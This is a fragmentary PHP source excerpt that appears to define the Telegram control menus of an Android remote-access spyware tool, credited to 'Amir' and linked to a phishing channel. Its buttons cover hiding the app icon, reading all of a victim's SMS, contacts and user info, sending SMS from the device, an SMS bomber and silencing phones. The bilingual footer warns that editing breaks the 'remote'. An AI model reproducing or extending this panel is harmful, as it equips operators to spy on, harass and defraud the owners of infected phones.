...
[[['text'=>"💀TARGET PANEL💀",'callback_data' => 'controol']],
[['text'=>"🫂ONLINE USERS🫂",'callback_data' => 'onlineu']],
[['text'=>"⚙AUTO HIDE⚙",'callback_data' => 'ahide'],['text'=>"🔗AUTO SMS🔗",'callback_data' => 'fsssms']],
[['text'=>"💣SMS BOMBER💣",'callback_data' => 'smsbmbr']],
[['text'=>"🥷HIDE ALL🥷",'callback_data' => 'hideall'],['text'=>"️🌚UNHIDE ALL🌚",'callback_data' => 'visiall']],
[['text'=>"🔕 SILENT ALL🔕",'callback_data' => 'silentall']],
[['text'=>"☢CHANGE URL☢",'callback_data' => 'poetal']],
[['text'=>"👤USERS COUNT👤",'callback_data' => 'dacfpf8i'],['text'=>"$count",'callback_data' => 'infoytgep']],
[['text'=>"YOERS URL👉",'callback_data' => 'dac8i'],['text'=>"$dom",'callback_data' => 'inftgep']],
[['text'=>"️owner",'callback_data' => 'infop'],['text'=>"Amir",'url'=>"https://t.me/tlirx"]],
[['text'=>"️channel",'callback_data' => 'infop'],['text'=>"AmiR Sad",'url'=>"https://t.me/SaD_FISHING"]],
]));
$admins = json_encode(array('inline_keyboard'=>
[[['text'=>"🥷HIDE ICON🥷",'callback_data' => 'iconhidee'],['text'=>"🫂unhide icon",'callback_data' => 'unhidee']],
[['text'=>"💆ALL SMS💆",'callback_data' => 'alssms']],
[['text'=>"💁USER INFO💁",'callback_data' => 'infou'],['text'=>"🤧contacts🤧",'callback_data' => 'contacct']],
[['text'=>"📥SEND SMS📥",'callback_data' => 'smssend']],
[['text'=>"🌎NORMAL🌎",'callback_data' => 'noormmal'],['text'=>"🔕silent🔕",'callback_data' => 'sileent']],
[['text'=>"📳VIBRE📳",'callback_data' => 'vibeeree'],['text'=>"✉️last sms✉️",'callback_data' => 'laastssms']],
[['text'=>"🚪BACK🚪",'callback_data' => 'booook']]
]));
...
file_put_contents("kir","");
	    	     ...
	    	     𝚃𝚑𝚒𝚜 𝚛𝚎𝚖𝚘𝚝𝚎 𝚒𝚜 𝚖𝚊𝚍𝚎 𝚋𝚢 𝐚𝐦𝐢𝐫 𝚊𝚗𝚍 𝚌𝚊𝚗𝚗𝚘𝚝 𝚋𝚎 𝚎𝚍𝚒𝚝𝚎𝚍 𝚒𝚗 𝚊𝚗𝚢 𝚠𝚊𝚢. 𝙸𝚏 𝚢𝚘𝚞 𝚎𝚍𝚒𝚝 𝚒𝚝, 𝚒𝚝 𝚠𝚒𝚕𝚕 𝚗𝚘𝚝 𝚠𝚘𝚛𝚔 𝚊𝚗𝚢𝚖𝚘𝚛𝚎!
	    	     این ریموت توسط امیر نوشته شده و به هیچ وجه قابل ادیت نیست اگر ادیت بشه دیگه کار نمیکنه!
	    	     𝗚𝘂𝗶𝗱𝗲 ~ 《🎗》
